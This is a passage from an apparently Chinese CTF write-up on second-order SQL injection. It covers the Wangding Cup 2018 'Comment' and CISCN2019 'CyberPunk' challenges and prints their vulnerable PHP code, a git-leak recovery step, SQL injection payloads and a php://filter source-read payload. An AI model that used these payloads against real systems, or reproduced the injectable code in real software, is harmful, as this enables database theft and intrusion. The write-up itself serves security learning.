mysql_affected_rows();</span><br></pre></td></tr></table></figure>\n<p>用于当前修改的是 admin’# 的密码，username 的值为 admin’#，于是语句变为下面的语句</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=admin&#x27;# and password=&#x27;$curr_pass&#x27; &quot;;</span><br></pre></td></tr></table></figure>\n<p>产生的问题在于原密码被注释了，我们修改的用户从 admin’# 变为了 admin，直接不需要原始密码就可以修改管理员的密码</p>\n<p>于是二次注入产生</p>\n<h5 id=\"二次注入相关的ctf-game\"><a class=\"markdownIt-Anchor\" href=\"#二次注入相关的ctf-game\">#</a> 二次注入相关的 CTF GAME</h5>\n<h6 id=\"网鼎杯-2018comment\"><a class=\"markdownIt-Anchor\" href=\"#网鼎杯-2018comment\">#</a> [网鼎杯 2018] Comment</h6>\n<p>1. 密码爆破，自己去 burp 里面玩吧</p>\n<p>2.git 泄露</p>\n<p>git add   // 提交到缓冲区</p>\n<p>git commit -m // 提交到本地仓库</p>\n<p>git push  origin master// 提交到远端仓库</p>\n<p>当 git 泄露时可以通过 githack 还原文件</p>\n<p>git log --reflog 可以查看提交记录</p>\n<p>通过 git reset --hard 更改指针位置</p>\n<p>通过 githacker 还原文件，如果不修改文件指针的情况下回还原下面的 write_do.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&quot;mysql.php&quot;</span>;</span><br><span class=\"line\"><span class=\"title function_ invoke__\">session_start</span>();</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;login&#x27;</span>] != <span class=\"string\">&#x27;yes&#x27;</span>)&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;Location: ./login.php&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">die</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;do&#x27;</span>]))&#123;</span><br><span class=\"line\"><span class=\"keyword\">switch</span> (<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;do&#x27;</span>])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"keyword\">case</span> <span class=\"string\">&#x27;write&#x27;</span>:</span><br><span class=\"line\">    <span class=\"keyword\">break</span>;</span><br><span class=\"line\"><span class=\"keyword\">case</span> <span class=\"string\">&#x27;comment&#x27;</span>:</span><br><span class=\"line\">    <span class=\"keyword\">break</span>;</span><br><span class=\"line\"><span class=\"keyword\">default</span>:</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;Location: ./index.php&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;Location: ./index.php&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>需要换一个能还原指针位置的 githacker，别用 buuoj，sbbuuoj 不让扫描</p>\n<p>最后还原出的源码是</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//write_do.php</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&quot;mysql.php&quot;</span>;</span><br><span class=\"line\"><span class=\"title function_ invoke__\">session_start</span>();</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;login&#x27;</span>] != <span class=\"string\">&#x27;yes&#x27;</span>)&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;Location: ./login.php&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">die</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;do&#x27;</span>]))&#123;</span><br><span class=\"line\"><span class=\"keyword\">switch</span> (<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;do&#x27;</span>])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"keyword\">case</span> <span class=\"string\">&#x27;write&#x27;</span>:</span><br><span class=\"line\">    <span class=\"variable\">$category</span> = <span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;category&#x27;</span>]);</span><br><span class=\"line\">    <span class=\"variable\">$title</span> = <span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;title&#x27;</span>]);</span><br><span class=\"line\">    <span class=\"variable\">$content</span> = <span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;content&#x27;</span>]);</span><br><span class=\"line\">    <span class=\"variable\">$sql</span> = <span class=\"string\">&quot;insert into board</span></span><br><span class=\"line\"><span class=\"string\">            set category = &#x27;<span class=\"subst\">$category</span>&#x27;,</span></span><br><span class=\"line\"><span class=\"string\">                title = &#x27;<span class=\"subst\">$title</span>&#x27;,</span></span><br><span class=\"line\"><span class=\"string\">                content = &#x27;<span class=\"subst\">$content</span>&#x27;&quot;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$result</span> = <span class=\"title function_ invoke__\">mysql_query</span>(<span class=\"variable\">$sql</span>);</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;Location: ./index.php&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">break</span>;</span><br><span class=\"line\"><span class=\"keyword\">case</span> <span class=\"string\">&#x27;comment&#x27;</span>:</span><br><span class=\"line\">    <span class=\"variable\">$bo_id</span> = <span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;bo_id&#x27;</span>]);</span><br><span class=\"line\">    <span class=\"variable\">$sql</span> = <span class=\"string\">&quot;select category from board where id=&#x27;<span class=\"subst\">$bo_id</span>&#x27;&quot;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$result</span> = <span class=\"title function_ invoke__\">mysql_query</span>(<span class=\"variable\">$sql</span>);</span><br><span class=\"line\">    <span class=\"variable\">$num</span> = <span class=\"title function_ invoke__\">mysql_num_rows</span>(<span class=\"variable\">$result</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"variable\">$num</span>&gt;<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">    <span class=\"variable\">$category</span> = <span class=\"title function_ invoke__\">mysql_fetch_array</span>(<span class=\"variable\">$result</span>)[<span class=\"string\">&#x27;category&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$content</span> = <span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;content&#x27;</span>]);</span><br><span class=\"line\">    <span class=\"variable\">$sql</span> = <span class=\"string\">&quot;insert into comment</span></span><br><span class=\"line\"><span class=\"string\">            set category = &#x27;<span class=\"subst\">$category</span>&#x27;,</span></span><br><span class=\"line\"><span class=\"string\">                content = &#x27;<span class=\"subst\">$content</span>&#x27;,</span></span><br><span class=\"line\"><span class=\"string\">                bo_id = &#x27;<span class=\"subst\">$bo_id</span>&#x27;&quot;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$result</span> = <span class=\"title function_ invoke__\">mysql_query</span>(<span class=\"variable\">$sql</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;Location: ./comment.php?id=<span class=\"subst\">$bo_id</span>&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">break</span>;</span><br><span class=\"line\"><span class=\"keyword\">default</span>:</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;Location: ./index.php&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;Location: ./index.php&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>注意如下代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$category</span> = <span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;category&#x27;</span>]);</span><br><span class=\"line\"><span class=\"variable\">$title</span> = <span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;title&#x27;</span>]);</span><br><span class=\"line\"><span class=\"variable\">$content</span> = <span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;content&#x27;</span>]);</span><br><span class=\"line\"><span class=\"variable\">$sql</span> = <span class=\"string\">&quot;insert into board set category = &#x27;<span class=\"subst\">$category</span>&#x27;, title = &#x27;<span class=\"subst\">$title</span>&#x27;,content = &#x27;<span class=\"subst\">$content</span>&#x27;&quot;</span>;</span><br><span class=\"line\"><span class=\"variable\">$result</span> = <span class=\"title function_ invoke__\">mysql_query</span>(<span class=\"variable\">$sql</span>);</span><br><span class=\"line\"><span class=\"comment\">//在插入的时候所有接收的参数都用了addslashes过滤，不存在漏洞</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"variable\">$bo_id</span> = <span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;bo_id&#x27;</span>]);</span><br><span class=\"line\"><span class=\"variable\">$sql</span> = <span class=\"string\">&quot;select category from board where id=&#x27;<span class=\"subst\">$bo_id</span>&#x27;&quot;</span>;</span><br><span class=\"line\"><span class=\"variable\">$result</span> = <span class=\"title function_ invoke__\">mysql_query</span>(<span class=\"variable\">$sql</span>);</span><br><span class=\"line\"><span class=\"variable\">$num</span> = <span class=\"title function_ invoke__\">mysql_num_rows</span>(<span class=\"variable\">$result</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$num</span>&gt;<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\"><span class=\"variable\">$category</span> = <span class=\"title function_ invoke__\">mysql_fetch_array</span>(<span class=\"variable\">$result</span>)[<span class=\"string\">&#x27;category&#x27;</span>];    <span class=\"comment\"># 注意这行，在从数据库中取出数据时没有过滤，存在二次注入</span></span><br><span class=\"line\"><span class=\"variable\">$content</span> = <span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;content&#x27;</span>]);</span><br><span class=\"line\"><span class=\"variable\">$sql</span> = <span class=\"string\">&quot;insert into comment</span></span><br><span class=\"line\"><span class=\"string\">        set category = &#x27;<span class=\"subst\">$category</span>&#x27;,</span></span><br><span class=\"line\"><span class=\"string\">            content = &#x27;<span class=\"subst\">$content</span>&#x27;,</span></span><br><span class=\"line\"><span class=\"string\">            bo_id = &#x27;<span class=\"subst\">$bo_id</span>&#x27;&quot;</span>;</span><br><span class=\"line\"><span class=\"variable\">$result</span> = <span class=\"title function_ invoke__\">mysql_query</span>(<span class=\"variable\">$sql</span>);</span><br></pre></td></tr></table></figure>\n<p>通过上面代码分析，我们可以发现是存在二次注入，注入点在 category 中</p>\n<p>这边有点需要注意：虽然 addslashes 会转义’，但在插入数据库时转义字符 \\ 并不会插入数据库</p>\n<p>接下来构造注入语句：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221023180732878.png\" alt=\"image-20221023180732878\"></p>\n<blockquote>\n<p>这个 title 可以乱写，注入点在 category 中，首先先闭合原来的 category，然后去覆盖 content，因为如果直接注释，插入数据库会报列数不匹配的错误</p>\n<p>在覆盖的同时，我们的注入语句也在自己写的 content 中</p>\n<p>最后他给的 content 随便乱写，因为被我们写的注入语句的 content 覆盖了</p>\n<p>最后的语句为：</p>\n<p>insert into board set category = ‘a\\’,content=database(),/*, title = ‘aa’,content = ‘aaaa’;</p>\n<p>此时’仍被转义，但插入数据库后转义符号消失，这就是为什么在下一个页面我们的 aaaa 正文能显示</p>\n</blockquote>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221023181703773.png\" alt=\"image-20221023181703773\"></p>\n<p>接下来到 comment 页面，会根据刚刚的 title 查询出我们当时写的，即从数据库中取出 category，然后加上我们的提交的留言再次入库</p>\n<blockquote>\n<p>category 取出来的时候是这么一串：a’,content=database (),/*，注意转义字符消失了</p>\n<p>然后我们需要去 content 闭合注释符，再用单行注入把后面没用的东西注释掉</p>\n<p>最后语句变为了</p>\n<p>sql =` \"insert into comment set category = 'a',content=database(),/*', content = '*/#', bo_id = 'bo_id’&quot;;`</p>\n</blockquote>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221023181848314.png\" alt=\"image-20221023181848314\"></p>\n<p>得到库名，下面的 getflag 操作不在赘述</p>\n<h6 id=\"2ciscn2019-华北赛区-day1-web5cyberpunk\"><a class=\"markdownIt-Anchor\" href=\"#2ciscn2019-华北赛区-day1-web5cyberpunk\">#</a> 2.[CISCN2019 华北赛区 Day1 Web5] CyberPunk</h6>\n<!--?file=?--> 接收get传入的file参数，用php伪协议读源码\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>\n<p>修改地址存在二次注入，从数据库中取 old_address 时没有过滤</p>\n<p>分析 config.php，这是一个数据库连接配置文件，没有可以利用的地方，</p>\n<p>在 confirm.php 中，对 user_name 和 phone 进行了过滤，但 address 没有，说明 address 是可能存在注入点，然后将这三个插入到数据库中</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">//confirm.php</span></span><br><span class=\"line\"><span class=\"keyword\">require_once</span> <span class=\"string\">&quot;config.php&quot;</span>;</span><br><span class=\"line\"><span class=\"comment\">//var_dump($_POST);</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"keyword\">empty</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;user_name&quot;</span>]) &amp;&amp; !<span class=\"keyword\">empty</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;address&quot;</span>]) &amp;&amp; !<span class=\"keyword\">empty</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;phone&quot;</span>]))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$pattern</span> = <span class=\"string\">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$user_name</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;user_name&quot;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$address</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;address&quot;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$phone</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;phone&quot;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"variable\">$pattern</span>,<span class=\"variable\">$user_name</span>) || <span class=\"title function_ invoke__\">preg_match</span>(<span class=\"variable\">$pattern</span>,<span class=\"variable\">$phone</span>))&#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;no sql inject!&#x27;</span>;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$sql</span> = <span class=\"string\">&quot;select * from `user` where `user_name`=&#x27;<span class=\"subst\">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class=\"subst\">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class=\"line\">        <span class=\"variable\">$fetch</span> = <span class=\"variable\">$db</span>-&gt;<span class=\"title function_ invoke__\">query</span>(<span class=\"variable\">$sql</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"variable\">$fetch</span>-&gt;num_rows&gt;<span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = <span class=\"variable\">$user_name</span>.<span class=\"string\">&quot;已提交订单&quot;</span>;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$sql</span> = <span class=\"string\">&quot;insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)&quot;</span>;</span><br><span class=\"line\">        <span class=\"variable\">$re</span> = <span class=\"variable\">$db</span>-&gt;<span class=\"title function_ invoke__\">prepare</span>(<span class=\"variable\">$sql</span>);</span><br><span class=\"line\">        <span class=\"variable\">$re</span>-&gt;<span class=\"title function_ invoke__\">bind_param</span>(<span class=\"string\">&quot;sss&quot;</span>, <span class=\"variable\">$user_name</span>, <span class=\"variable\">$address</span>, <span class=\"variable\">$phone</span>);</span><br><span class=\"line\">        <span class=\"variable\">$re</span> = <span class=\"variable\">$re</span>-&gt;<span class=\"title function_ invoke__\">execute</span>();</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!<span class=\"variable\">$re</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;error&#x27;</span>;</span><br><span class=\"line\">            <span class=\"title function_ invoke__\">print_r</span>(<span class=\"variable\">$db</span>-&gt;error);</span><br><span class=\"line\">            <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;订单提交成功&quot;</span>;</span><br></pre></td></tr></table></figure>\n<p>在 change.php, 中 address 没有进行关键字过滤，只是使用 addslashes 进行转义后进行了查询，因此注入点不会在 select 语句中，</p>\n<p>但查询完后修改 address 时，旧的 address 从数据库拿出来没有进行过滤，二次注入发生</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">//change.php</span></span><br><span class=\"line\"><span class=\"keyword\">require_once</span> <span class=\"string\">&quot;config.php&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"keyword\">empty</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;user_name&quot;</span>]) &amp;&amp; !<span class=\"keyword\">empty</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;address&quot;</span>]) &amp;&amp; !<span class=\"keyword\">empty</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;phone&quot;</span>]))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$pattern</span> = <span class=\"string\">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$user_name</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;user_name&quot;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$address</span> = <span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;address&quot;</span>]);</span><br><span class=\"line\">    <span class=\"variable\">$phone</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;phone&quot;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"variable\">$pattern</span>,<span class=\"variable\">$user_name</span>) || <span class=\"title function_ invoke__\">preg_match</span>(<span class=\"variable\">$pattern</span>,<span class=\"variable\">$phone</span>))&#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;no sql inject!&#x27;</span>;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$sql</span> = <span class=\"string\">&quot;select * from `user` where `user_name`=&#x27;<span class=\"subst\">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class=\"subst\">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class=\"line\">        <span class=\"variable\">$fetch</span> = <span class=\"variable\">$db</span>-&gt;<span class=\"title function_ invoke__\">query</span>(<span class=\"variable\">$sql</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$fetch</span>) &amp;&amp; <span class=\"variable\">$fetch</span>-&gt;num_rows&gt;<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">        <span class=\"variable\">$row</span> = <span class=\"variable\">$fetch</span>-&gt;<span class=\"title function_ invoke__\">fetch_assoc</span>();</span><br><span class=\"line\">        <span class=\"variable\">$sql</span> = <span class=\"string\">&quot;update `user` set `address`=&#x27;&quot;</span>.<span class=\"variable\">$address</span>.<span class=\"string\">&quot;&#x27;, `old_address`=&#x27;&quot;</span>.<span class=\"variable\">$row</span>[<span class=\"string\">&#x27;address&#x27;</span>].<span class=\"string\">&quot;&#x27; where `user_id`=&quot;</span>.<span class=\"variable\">$row</span>[<span class=\"string\">&#x27;user_id&#x27;</span>];</span><br><span class=\"line\">        <span class=\"variable\">$result</span> = <span class=\"variable\">$db</span>-&gt;<span class=\"title function_ invoke__\">query</span>(<span class=\"variable\">$sql</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!<span class=\"variable\">$result</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;error&#x27;</span>;</span><br><span class=\"line\">            <span class=\"title function_ invoke__\">print_r</span>(<span class=\"variable\">$db</span>-&gt;error);</span><br><span class=\"line\">            <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;订单修改成功&quot;</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;未找到订单!&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;信息不全&quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>因此我们在 confirm.php 插入数据库中时，提交注入语句</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221023190851989.png\" alt=\"image-20221023190851989\"></p>\n<p>在修改地址时二次引用</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221023190938216.png\" alt=\"image-20221023190938216\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221023190949077.png\" alt=\"image-20221023190949077\"></p>\n<p>因为不是 ctf 教程，所以为什么 flag 在 flag.txt，flag.txt 为什么在根下就不赘述了</p>\n<p>[[CISCN2019 华北赛区 Day1 Web5] CyberPunk.rar](buu [CISCN2019 华北赛区 Day1 Web5] CyberPunk.rar)</p>\n<p>然后接下来带来一些花活：</p>\n<h6 id=\"php-exit-绕过\"><a class=\"markdownIt-Anchor\" href=\"#php-exit-绕过\">#</a>  <code>&lt;?php exit; ?&gt;</code>  绕过</h6>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$content = &#x27;&lt;?php exit; ?&gt;&#x27;;</span><br><span class=\"line\">$content .= $_POST[&#x27;txt&#x27;];</span><br><span class=\"line\">file_put_contents($_POST[&#x27;filename&#x27;], 